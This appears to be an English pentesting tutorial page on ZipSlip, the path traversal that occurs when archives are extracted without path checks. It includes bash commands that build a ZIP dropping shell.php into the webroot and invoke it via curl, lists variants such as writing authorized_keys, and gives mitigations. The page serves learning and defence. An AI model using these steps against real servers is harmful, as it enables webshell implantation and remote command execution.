---
topic: "ZipSlip: traversal during archive extraction"
tags: [web, zipslip, upload, path-traversal]
---

# ZipSlip: traversal during archive extraction

[🌐 Español](zipslip.md) | **English**

## Concept

If an application extracts a ZIP without validating internal paths, an entry containing `../` can write outside the destination. This allows overwriting server files or dropping a webshell.

## When it applies

- The application accepts and extracts ZIPs.
- The internal name is not normalized.
- The process can write to the webroot.

## Procedure

1. Create a file with a `../../..` path inside the ZIP.
2. Upload the ZIP.
3. Check the write path.
4. Request the file from the web.

```bash
cp shell.php ../../../../var/www/html/shell.php
zip malicious.zip ../../../../var/www/html/shell.php
unzip -l malicious.zip
# subir malicious.zip
curl 'http://<IP>/shell.php?cmd=id'
```

## Variants

- Overwrite a view or configuration file.
- Write to `authorized_keys` if the process is root.
- Use absolute names if the ZIP allows them.

## Limitations

- Extraction must preserve paths.
- The process must be able to write the destination.
- The file must be interpreted by the server.

## Mitigation and detection

- Normalize and confine extracted paths.
- Use an isolated directory and minimal permissions.
- Reject absolute or `..` entries.

## References

- <https://security.snyk.io/research/zip-slip-vulnerability>
- <https://owasp.org/www-community/attacks/Path_Traversal>
- <https://attack.mitre.org/techniques/T1105/>
